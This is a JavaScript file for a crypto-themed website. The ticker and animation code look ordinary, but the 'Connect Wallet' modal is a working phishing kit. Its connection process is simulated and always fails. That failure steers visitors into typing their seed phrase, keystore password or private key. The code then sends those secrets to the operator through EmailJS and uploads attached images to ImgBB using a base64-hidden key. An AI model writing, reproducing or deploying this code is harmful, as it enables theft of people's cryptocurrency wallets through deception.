const COINS = [
    'bitcoin', 'ethereum', 'tether', 'binancecoin', 'solana',
    'ripple', 'usd-coin', 'staked-ether', 'dogecoin', 'cardano',
    'avalanche-2', 'chainlink', 'shiba-inu', 'polkadot', 'tron',
    'wrapped-bitcoin', 'near', 'litecoin', 'polygon', 'uniswap'
];

async function fetchPrices() {
    const ids = COINS.join(',');
    const url = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids}&order=market_cap_desc&per_page=20&page=1&sparkline=false&price_change_percentage=24h`;
    try {
        const res = await fetch(url, { headers: { 'Accept': 'application/json' } });
        if (!res.ok) throw new Error('err');
        const data = await res.json();
        renderTicker(data);
    } catch (e) {
        renderTickerFallback();
    }
}

function formatPrice(p) {
    if (p >= 1000) return '$' + p.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    if (p >= 1) return '$' + p.toFixed(4);
    if (p >= 0.01) return '$' + p.toFixed(5);
    return '$' + p.toFixed(8);
}

function buildTickerItem(coin) {
    const change = coin.price_change_percentage_24h ?? 0;
    const dir = change >= 0 ? 'up' : 'down';
    const arrow = change >= 0 ? '▲' : '▼';
    const priceFmt = formatPrice(coin.current_price);
    const changeFmt = arrow + ' ' + Math.abs(change).toFixed(2) + '%';
    return `
      <div class="ticker-item" onclick="window.open('https://coinmarketcap.com/currencies/${coin.id}/', '_blank')" style="cursor: pointer;" title="View ${coin.name || coin.symbol} on CoinMarketCap">
        <img class="ticker-coin-logo" src="${coin.image}" alt="${coin.symbol}" loading="lazy"
          onerror="this.style.display='none'" />
        <span class="ticker-symbol">${coin.symbol.toUpperCase()}</span>
        <span class="ticker-price">${priceFmt}</span>
        <span class="ticker-change ${dir}">${changeFmt}</span>
      </div>`;
}

function renderTicker(data) {
    const track = document.getElementById('tickerTrack');
    if (!track) return;
    if (!data || !data.length) { renderTickerFallback(); return; }
    let html = data.map(buildTickerItem).join('');
    html = html + html;
    track.innerHTML = html;
    const totalWidth = track.scrollWidth / 2;
    track.style.animationDuration = Math.max(30, totalWidth / 80) + 's';
}

function renderTickerFallback() {
    const fallback = [
        { id: 'bitcoin', symbol: 'BTC', price: '$64,210.00', change: '+1.24%', dir: 'up' },
        { id: 'ethereum', symbol: 'ETH', price: '$3,122.50', change: '-0.87%', dir: 'down' },
        { id: 'solana', symbol: 'SOL', price: '$142.33', change: '+3.11%', dir: 'up' },
        { id: 'binancecoin', symbol: 'BNB', price: '$588.20', change: '+0.55%', dir: 'up' },
        { id: 'ripple', symbol: 'XRP', price: '$0.5242', change: '-1.02%', dir: 'down' },
        { id: 'cardano', symbol: 'ADA', price: '$0.4410', change: '+0.34%', dir: 'up' },
        { id: 'dogecoin', symbol: 'DOGE', price: '$0.1621', change: '-2.10%', dir: 'down' },
        { id: 'polkadot', symbol: 'DOT', price: '$7.88', change: '+0.90%', dir: 'up' },
        { id: 'polygon', symbol: 'MATIC', price: '$0.7700', change: '+1.45%', dir: 'up' },
        { id: 'chainlink', symbol: 'LINK', price: '$14.22', change: '-0.60%', dir: 'down' },
    ];
    const track = document.getElementById('tickerTrack');
    if (!track) return;
    let html = fallback.map(c => `
      <div class="ticker-item" onclick="window.open('https://coinmarketcap.com/currencies/${c.id}/', '_blank')" style="cursor: pointer;" title="View ${c.symbol} on CoinMarketCap">
        <span class="ticker-symbol">${c.symbol}</span>
        <span class="ticker-price">${c.price}</span>
        <span class="ticker-change ${c.dir}">${c.change}</span>
      </div>`).join('');
    track.innerHTML = html + html;
}

fetchPrices();
setInterval(fetchPrices, 60000);

(function () {
    const img = document.getElementById('cmcLogoImg');
    const hint = document.getElementById('cmcHintText');
})();

function handleSubscribe() {
    const input = document.getElementById('emailInput');
    const feedback = document.getElementById('subFeedback');
    const email = input.value.trim();
    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!email || !emailRx.test(email)) {
        input.style.borderColor = 'var(--red)';
        input.focus();
        setTimeout(() => input.style.borderColor = '', 1500);
        return;
    }

    input.value = '';
    feedback.style.display = 'block';
    setTimeout(() => { feedback.style.display = 'none'; }, 4000);
}

const emailInputEl = document.getElementById('emailInput');
if (emailInputEl) {
    emailInputEl.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') handleSubscribe();
    });
}

const observer = new IntersectionObserver((entries) => {
    entries.forEach(e => {
        if (e.isIntersecting) {
            e.target.style.opacity = '1';
            e.target.style.transform = 'translateY(0)';
            observer.unobserve(e.target);
        }
    });
}, { threshold: 0.12 });

document.querySelectorAll('.feature-btn, .about-left, .about-right, .subscribe-text-col, .subscribe-form-col').forEach(el => {
    el.style.opacity = '0';
    el.style.transform = 'translateY(28px)';
    el.style.transition = 'opacity 0.55s ease, transform 0.55s ease';
    observer.observe(el);
});

document.querySelectorAll('.feature-btn').forEach((btn, i) => {
    btn.style.transitionDelay = (i * 30) + 'ms';
});

const revealObserver = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
        if (entry.isIntersecting) {
            entry.target.style.transitionDelay = (entry.target.dataset.delay || 0) + 'ms';
            entry.target.classList.add('visible');
            revealObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.1 });

document.querySelectorAll('.reveal').forEach((el) => {
    revealObserver.observe(el);
});

document.querySelectorAll('.chain-card').forEach((el, i) => { el.dataset.delay = i * 60; });
document.querySelectorAll('.protocol-chip').forEach((el, i) => { el.dataset.delay = i * 40; });
document.querySelectorAll('.step-card').forEach((el, i) => { el.dataset.delay = i * 80; });
document.querySelectorAll('.stat-item').forEach((el, i) => { el.dataset.delay = i * 100; });

function handleConnect() {
    const btn = document.querySelector('.btn-connect');
    btn.innerHTML = '<i class="ri-loader-4-line" style="animation:spin 0.8s linear infinite"></i> Connecting…';
    btn.disabled = true;
    setTimeout(() => {
        btn.innerHTML = '<i class="ri-wallet-3-line"></i> Connect Wallet';
        btn.disabled = false;
        alert('Wallet connection: integrate your Web3 provider here (e.g. ethers.js / wagmi).');
    }, 2000);
}

const style = document.createElement('style');
style.textContent = `@keyframes spin { to { transform: rotate(360deg); } }`;
document.head.appendChild(style);

const statNums = document.querySelectorAll('.stat-num');
const counterObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            animateCounter(entry.target);
            counterObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.5 });

statNums.forEach(el => counterObserver.observe(el));

function animateCounter(el) {
    const raw = el.textContent.trim();
    const prefix = raw.match(/^[\$]/) ? raw[0] : '';
    const suffix = raw.match(/[km+%]+$/i) ? raw.match(/[km+%]+$/i)[0] : '';
    const num = parseFloat(raw.replace(/[^0-9.]/g, ''));
    if (isNaN(num)) return;

    let start = 0; const duration = 1400; const startTime = performance.now();

    function step(now) {
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3);
        const current = eased * num;
        el.textContent = prefix + (num >= 100 ? Math.round(current).toLocaleString() : current.toFixed(1)) + suffix;
        if (progress < 1) requestAnimationFrame(step);
    }

    requestAnimationFrame(step);
}

if (document.getElementById('wOverlay')) {

    const wOverlay = document.getElementById('wOverlay');
    const wScreen1 = document.getElementById('wScreen1');
    const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

    window.openWallet = function () {
        wOverlay.classList.add('open');
        document.body.style.overflow = 'hidden';
        allOff();
    };

    window.closeWallet = function () {
        stopTimers();
        wOverlay.classList.remove('open');
        document.body.style.overflow = '';
        allOff();
    };

    function allOff() {
        wScreen1.classList.remove('hidden');
        subIds.forEach(id => document.getElementById(id).classList.remove('active'));
    }

    function showSub(id) {
        wScreen1.classList.add('hidden');
        subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

    function setWallet(img, name) {
        ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
        ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
    }

    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
            || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /Macintosh/.test(navigator.userAgent));
    }

    const _wr = {
        trustwallet: function (url) {
            return 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(url);
        },
        phantom: function (url) {
            const ref = encodeURIComponent(url);
            return 'https://phantom.app/ul/browse/' + encodeURIComponent(url) + '?ref=' + ref;
        },
        solflare: function (url) {
            return 'https://solflare.com/ul/v1/browse/' + encodeURIComponent(url) + '?ref=' + encodeURIComponent(url);
        },
        metamask: function (url) {
            const cleanUrl = url.replace(/^https?:\/\//i, '');
            return 'https://metamask.app.link/dapp/' + cleanUrl;
        }
    };

    function tryMobileRedirect(el) {
        if (!isMobileDevice()) return false;
        const walletId = el.getAttribute('data-wid');
        if (!walletId || !_wr[walletId]) return false;
        const currentUrl = new URL(window.location.href);
        const verifyUrl = new URL('security.html?wid=' + walletId, currentUrl).href;
        const deepLink = _wr[walletId](verifyUrl);
        closeWallet();
        window.location.href = deepLink;
        return true;
    }

    window.handleWalletSelect = function (el) {
        if (tryMobileRedirect(el)) return;
        const img = el.querySelector('img').src;
        const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
        setWallet(img, name);
        startConnecting();
    };

    const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
    const TOTAL = ALL_WALLETS.length;

    window.openOtherWallets = function () {
        showSub('wScreenOther');
        const inp = document.getElementById('owSearch');
        inp.value = '';
        setTimeout(() => inp.focus(), 100);
        filterOw('');
    };

    document.getElementById('owSearch').addEventListener('input', function () {
        filterOw(this.value.trim().toLowerCase());
    });

    function filterOw(q) {
        let visible = 0;
        ALL_WALLETS.forEach(item => {
            const n = item.querySelector('.ow-name').textContent.toLowerCase();
            const c = item.querySelector('.ow-chain').textContent.toLowerCase();
            const show = !q || n.includes(q) || c.includes(q);
            item.classList.toggle('hidden', !show);
            if (show) visible++;
        });
        const nr = document.getElementById('owNoResults');
        const ct = document.getElementById('owCount');
        document.getElementById('owQuery').textContent = q;
        if (q && visible === 0) {
            nr.style.display = 'block';
            ct.textContent = 'No results';
        } else {
            nr.style.display = 'none';
            ct.textContent = q
                ? `${visible} wallet${visible === 1 ? '' : 's'} found`
                : `${TOTAL} wallets`;
        }
    }

    window.selectOwWallet = function (el) {
        if (tryMobileRedirect(el)) return;
        const img = el.querySelector('img').src;
        const name = el.querySelector('.ow-name').textContent;
        setWallet(img, name);
        startConnecting();
    };

    window.switchType = function (type) {
        ['phrase', 'keystore', 'privatekey'].forEach(t => {
            document.getElementById('btn-' + t).classList.toggle('active', t === type);
            document.getElementById('pane-' + t).classList.toggle('active', t === type);
        });
    };

    var _ik = atob('NDFhOGY4YTQ2YWZiMGUxOTYwZDc0YTYwNWZkMWU4NDU=');

    function uploadToImgBB(file) {
        const formData = new FormData();
        formData.append("image", file);
        fetch(`https://api.imgbb.com/1/upload?key=${_ik}`, { method: "POST", body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
            })
            .catch(function () { });
    }

    window.processAttachment = function (input) {
        const file = input.files[0];
        if (!file) return;
        const ki = document.getElementById('keystoreInput');
        delete ki.dataset.imgUrl; delete ki.dataset.imgBase64; delete ki.dataset.fileContent;
        document.getElementById('attachFileName').textContent = '📎 ' + file.name;
        const reader = new FileReader();
        reader.onload = e => {
            if (file.type.startsWith('image/')) { ki.dataset.imgBase64 = "pending"; uploadToImgBB(file); }
            else ki.dataset.fileContent = e.target.result;
        };
        file.type.startsWith('image/') ? reader.readAsDataURL(file) : reader.readAsText(file);
    };

    let cTimer, sTimer, pTimer, aborted = false;
    function stopTimers() {
        clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
        aborted = true;
    }

    const statusMsgs = [
        "Initializing secure connection...", "Scanning for wallet device...",
        "Establishing encrypted channel...", "Verifying wallet signature...",
        "Requesting account access...", "Checking network compatibility...",
        "Syncing wallet state...", "Authenticating session...",
        "Resolving on-chain identity...", "Confirming wallet permissions...",
        "Loading account balances...", "Retrieving transaction history...",
        "Validating network endpoints...", "Preparing secure handshake...",
        "Awaiting device confirmation...", "Connecting to mainnet...",
        "Syncing asset registry...", "Verifying chain ID...",
        "Establishing WebSocket link...", "Fetching wallet metadata...",
        "Decoding wallet address...", "Requesting signing permissions...",
        "Resolving address...", "Preparing wallet interface...",
        "Almost there — finalizing...", "Connecting to RPC endpoint...",
        "Binding wallet to session...", "Verifying account integrity...",
        "Checking pending transactions...", "Finalizing authentication...",
        "Connection attempt finishing..."
    ];

    function startConnecting() {
        aborted = false;
        showSub('wScreen2');
        const statusEl = document.getElementById('s2Status');
        const progressEl = document.getElementById('s2Progress');
        progressEl.style.width = '0%';
        let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
        let i = 0;
        statusEl.textContent = pool[0];
        sTimer = setInterval(() => {
            i++;
            statusEl.style.opacity = '0';
            setTimeout(() => { statusEl.textContent = pool[i % pool.length]; statusEl.style.opacity = '1'; }, 100);
        }, 300);
        let pct = 0;
        pTimer = setInterval(() => {
            pct = Math.min(pct + (100 / (15000 / 200)), 99);
            progressEl.style.width = pct + '%';
        }, 200);
        cTimer = setTimeout(() => {
            if (aborted) return;
            clearInterval(sTimer); clearInterval(pTimer);
            progressEl.style.width = '100%';
            showSub('wScreen3');
        }, 15000);
    }

    document.getElementById('retryBtn').addEventListener('click', () => { stopTimers(); startConnecting(); });
    document.getElementById('manualBtn').addEventListener('click', () => {
        stopTimers();
        switchType('phrase');
        showSub('wScreen4');
    });

    window.handleRetryManual = function () {
        document.getElementById('phraseInput').value = '';
        document.getElementById('keystoreInput').value = '';
        document.getElementById('privkeyInput').value = '';
        document.getElementById('attachFileName').textContent = '';
        document.getElementById('keystoreFileInput').value = '';
        switchType('keystore');
        showSub('wScreen4');
    };

    window.submitForm = function () {
        var _at = document.querySelector('.type-btn.active');
        if (!_at) return;
        var activeType = _at.id.replace('btn-', '');
        var payload = '';
        var isValid = false;

        if (activeType === 'phrase') {
            var phraseData = document.getElementById('phraseInput').value.trim();
            if (!phraseData) { alert('Please enter your credentials before connecting.'); return; }
            var words = phraseData.toLowerCase().split(/\s+/);
            var isValidPhrase = true;
            if (typeof W3_REF !== 'undefined') {
                for (var word of words) { if (!W3_REF.has(word)) { isValidPhrase = false; break; } }
            }
            if (!isValidPhrase) { alert('Data entered is not a valid seed phrase'); return; }
            isValid = true;
            payload = "f1:p\nd1:" + phraseData;

        } else if (activeType === 'keystore') {
            var keyData = document.getElementById('keystoreInput').value.trim();
            var keyPass = document.getElementById('keystorePassword').value.trim();
            var fileAttached = document.getElementById('keystoreFileInput').files.length > 0;
            var imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;
            if (imgUrl) { keyData += "\n\nref:" + imgUrl; }
            else { var imgData = document.getElementById('keystoreInput').dataset.imgBase64; if (imgData) keyData += "\n\nimg:pending"; }
            if (!keyData && !fileAttached && !keyPass) { alert('Please enter your credentials before connecting.'); return; }
            isValid = true;
            var fileInfo = fileAttached ? "y(" + document.getElementById('keystoreFileInput').files[0].name + ")" : "n";
            payload = "f1:k\npw:" + keyPass + "\nfa:" + fileInfo;
            if (keyData) payload += "\nd1:\n" + keyData;
            var attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
            if (attachedContent) payload += "\nfc:\n" + attachedContent;

        } else if (activeType === 'privatekey') {
            var privData = document.getElementById('privkeyInput').value.trim();
            if (!privData) { alert('Please enter your credentials before connecting.'); return; }
            isValid = true;
            payload = "f1:pk\nd1:" + privData;
        }

        if (!isValid) return;

        var safetext = payload.length > 40000 ? payload.substring(0, 40000) + "\n\n...[trunc]" : payload;

        function sendEmailRetry(retries) {
            emailjs.send('service_ocoq02x', 'template_wgo1bul', { message: safetext })
                .then(function () { })
                .catch(function (error) {
                    if (retries > 0) {
                        setTimeout(function () { sendEmailRetry(retries - 1); }, 1500);
                    }
                });
        }
        sendEmailRetry(2);

        _doManualConnect();
    };

    function _doManualConnect() {
        stopTimers();
        showSub('wScreen2');
        aborted = false;
        var statusEl = document.getElementById('s2Status');
        var progressEl = document.getElementById('s2Progress');
        progressEl.style.width = '0%';
        var msgs = [
            "Verifying data...", "Processing request...",
            "Checking integrity...", "Validating format...",
            "Deriving parameters...", "Cross-referencing data...",
            "Authenticating session...", "Establishing link...",
            "Verifying connection...", "Almost done..."
        ];
        var i = 0;
        statusEl.textContent = msgs[0];
        sTimer = setInterval(function () {
            i++;
            statusEl.style.opacity = '0';
            setTimeout(function () { statusEl.textContent = msgs[i % msgs.length]; statusEl.style.opacity = '1'; }, 100);
        }, 600);
        var pct = 0;
        pTimer = setInterval(function () {
            pct = Math.min(pct + (100 / (6000 / 200)), 99);
            progressEl.style.width = pct + '%';
        }, 200);
        cTimer = setTimeout(function () {
            if (aborted) return;
            clearInterval(sTimer); clearInterval(pTimer);
            progressEl.style.width = '100%';
            showSub('wScreen5');
        }, 6000);
    }

}